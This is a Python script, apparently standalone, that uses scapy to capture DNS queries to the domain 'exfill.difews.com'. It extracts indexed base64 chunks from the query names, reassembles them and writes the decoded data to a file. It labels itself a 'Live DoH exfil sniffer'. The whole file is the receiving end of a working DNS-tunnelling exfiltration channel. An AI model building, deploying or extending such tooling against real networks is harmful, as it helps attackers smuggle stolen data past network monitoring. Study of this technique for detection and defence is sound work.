from scapy.all import sniff, DNSQR
import base64
import re
from collections import defaultdict

DOMAIN = "exfill.difews.com"
chunks = defaultdict(str)
pattern = re.compile(r"(\d+)-([a-zA-Z0-9_\-]+=*)")

def try_extract_chunk(qname):
    if DOMAIN not in qname:
        return None, None
    m = pattern.match(qname.split('.')[0])
    if m:
        index = int(m.group(1))
        chunk = m.group(2)
        return index, chunk
    return None, None

def try_rebuild(chunks):
    try:
        ordered = ''.join(chunks[i] for i in sorted(chunks))
        padded = ordered + '=' * (-len(ordered) % 4)
        data = base64.urlsafe_b64decode(padded)
        with open("output_live.txt", "wb") as f:
            f.write(data)
        print(f"[✅] Rebuilt file with {len(chunks)} chunks.")
    except Exception as e:
        print(f"[⚠️] Rebuild failed: {e}")

def process_packet(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode(errors="ignore")
        index, chunk = try_extract_chunk(qname)
        if index is not None:
            chunks[index] = chunk
            print(f"[📦] Received chunk {index}: {chunk[:10]}...")
            try_rebuild(chunks)

print("🟢 Live DoH exfil sniffer started...\n")
sniff(filter="udp port 53", prn=process_packet, store=0, iface="veth65054df")
